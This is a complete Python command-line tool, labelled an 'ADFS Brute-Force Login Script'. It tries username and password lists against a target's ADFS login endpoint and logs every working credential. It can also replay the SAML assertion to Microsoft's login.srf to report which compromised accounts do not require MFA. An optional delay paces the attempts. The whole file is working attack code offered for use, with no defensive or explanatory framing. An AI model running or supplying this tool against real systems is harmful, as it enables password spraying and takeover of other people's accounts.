import requests
import argparse
import re
import html
import time
from colorama import Fore, Style


def extract_saml_assertion(response_content):
    wresult_pattern = r'<input type="hidden" name="wresult" value="([^"]+)" \/>'
    wresult_match = re.search(wresult_pattern, response_content, re.DOTALL)

    if wresult_match:
        wresult_value = wresult_match.group(1)
        wresult_value = html.unescape(wresult_value)
        return wresult_value
    else:
        return None


def check_mfa_string(login_srf_response):
    return "BeginAuth" in login_srf_response.text


def check_authentication_cookies(login_srf_response):
    cookies = login_srf_response.cookies
    return "ESTSAUTHPERSISTENT" in cookies and "ESTSAUTH" in cookies


def send_login_request(
    target, username, password, verbose=False, log_file=None, check_mfa=False
):
    if verbose:
        print(f"{Fore.WHITE}[*] Trying login for {username}{Style.RESET_ALL}", end="\r")

    payload = {
        "UserName": username,
        "Password": password,
        "AuthMethod": "FormsAuthentication",
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    }

    try:
        with requests.Session() as session:
            adfs_login_response = session.post(
                f"{target}/adfs/ls/?client-request-id=&wa=wsignin1.0&wtrealm=urn:federation:MicrosoftOnline&wctx=cbcxt=&username={username}",
                data=payload,
                headers=headers,
                timeout=10,
            )
            adfs_login_response.raise_for_status()

            if (
                'action="https://login.microsoftonline.com:443/login.srf"'
                in adfs_login_response.text
            ):
                success_message = f"[+] Login success: {username} : {password}"
                print(f"{Fore.GREEN}{success_message}{Style.RESET_ALL}")
                if log_file:
                    with open(log_file, "a") as log:
                        log.write(success_message + "\n")

                if check_mfa:
                    wresult_value = extract_saml_assertion(adfs_login_response.text)
                    if wresult_value:
                        login_srf_url = "https://login.microsoftonline.com/login.srf"
                        login_srf_payload = {
                            "wa": "wsignin1.0",
                            "wresult": wresult_value,
                        }

                        login_srf_response = session.post(
                            login_srf_url,
                            data=login_srf_payload,
                            headers=headers,
                            timeout=10,
                        )
                        login_srf_response.raise_for_status()

                        if check_authentication_cookies(login_srf_response):
                            if check_mfa_string(login_srf_response):
                                mfa_message = f"[-] MFA is required for: {username}"
                                print(f"{Fore.YELLOW}{mfa_message}{Style.RESET_ALL}")
                                if log_file:
                                    log.write(mfa_message + "\n")
                            elif not check_mfa_string(login_srf_response):
                                mfa_message = f"[+] MFA is not required for: {username}"
                                print(f"{Fore.GREEN}{mfa_message}{Style.RESET_ALL}")
                                if log_file:
                                    log.write(mfa_message + "\n")
                            else:
                                print(
                                    f"{Fore.RED}[!] Unknown error checking MFA.{Style.RESET_ALL}"
                                )
                    else:
                        print(
                            f"{Fore.RED}[!] Required data not found in the response.{Style.RESET_ALL}"
                        )
            elif verbose:
                failure_message = f"[-] Login failed: {username} : {password}"
                print(f"{Fore.RED}{failure_message}{Style.RESET_ALL}")
                if log_file:
                    with open(log_file, "a") as log:
                        log.write(failure_message + "\n")

    except requests.exceptions.Timeout:
        print(f"{Fore.RED}[!] Request timed out.{Style.RESET_ALL}")
    except requests.exceptions.HTTPError as e:
        print(f"{Fore.RED}[!] HTTP Error occurred: {e}{Style.RESET_ALL}")
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}[!] Error occurred: {e}{Style.RESET_ALL}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="ADFS Brute-Force Login Script",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="Usage examples:"
        "\n  python script.py -t https://adfs.example.com -u user -p password123"
        "\n  python script.py -t https://adfs.example.com -U userlist.txt -p password123"
        "\n  python script.py -t https://adfs.example.com -u user -P passwordlist.txt"
        "\n  python script.py -t https://adfs.example.com -U userlist.txt -P passwordlist.txt"
        "\n\nExplanation of flags:"
        "\n  -t, --target [url]: ADFS target host URL (e.g., https://adfs.example.com)"
        "\n  -u, --username [user]: Single username to try"
        "\n  -U, --username-list [file]: File containing a list of usernames"
        "\n  -p, --password [pass]: Single password to use for login attempts"
        "\n  -P, --password-list [file]: File containing a list of passwords"
        "\n  --mfa: Check if Multi-Factor Authentication (MFA) is required after successful login"
        "\n  -v: Enable verbose mode"
        "\n  -l [file]: File to log the login results"
        "\n\nNote: Provide either a single password (-p) or a password list file (-P).\n",
    )

    parser.add_argument(
        "-t",
        "--target",
        type=str,
        required=True,
        help="ADFS target host URL (e.g., https://adfs.example.com)",
    )
    parser.add_argument(
        "-u", "--username", type=str, required=False, help="Single username to try"
    )
    parser.add_argument(
        "-U",
        "--username-list",
        type=str,
        required=False,
        help="File containing a list of usernames",
    )
    parser.add_argument(
        "-p",
        "--password",
        type=str,
        required=False,
        help="Single password to use for login attempts",
    )
    parser.add_argument(
        "-P",
        "--password-list",
        type=str,
        required=False,
        help="File containing a list of passwords",
    )
    parser.add_argument(
        "-v",
        "--verbose",
        action="store_true",
        default=False,
        help="Enable verbose mode to show all print statements",
    )
    parser.add_argument(
        "-l",
        "--log-file",
        type=str,
        required=False,
        help="File to log the login results",
    )
    parser.add_argument(
        "--mfa",
        action="store_true",
        help="Check if Multi-Factor Authentication (MFA) is required after successful login",
    )
    parser.add_argument(
        "-d",
        "--delay",
        type=int,
        default=0,
        help="Delay in seconds between login attempts (e.g., --delay 2 for 2 seconds delay)",
    )

    args = parser.parse_args()

    target = args.target
    usernames = []
    passwords = []
    log_file = args.log_file
    check_mfa = args.mfa
    verbose = args.verbose
    delay = args.delay

    if args.username:
        usernames.append(args.username)

    if args.username_list:
        try:
            with open(args.username_list, "r") as users_file:
                usernames.extend(users_file.read().splitlines())
        except FileNotFoundError:
            print(
                f"{Fore.RED}[!] Username list file '{args.username_list}' not found.{Style.RESET_ALL}"
            )
            exit(1)

    if args.password:
        passwords.append(args.password)

    if args.password_list:
        try:
            with open(args.password_list, "r") as passwords_file:
                passwords.extend(passwords_file.read().splitlines())
        except FileNotFoundError:
            print(
                f"{Fore.RED}[!] Password list file '{args.password_list}' not found.{Style.RESET_ALL}"
            )
            exit(1)

    print(f"{Fore.CYAN}[*] Target ADFS Host: {target}{Style.RESET_ALL}")

    for username in usernames:
        for password in passwords:
            send_login_request(
                target,
                username.strip(),
                password.strip(),
                verbose=verbose,
                log_file=log_file,
                check_mfa=check_mfa,
            )
            if delay:
                time.sleep(delay)
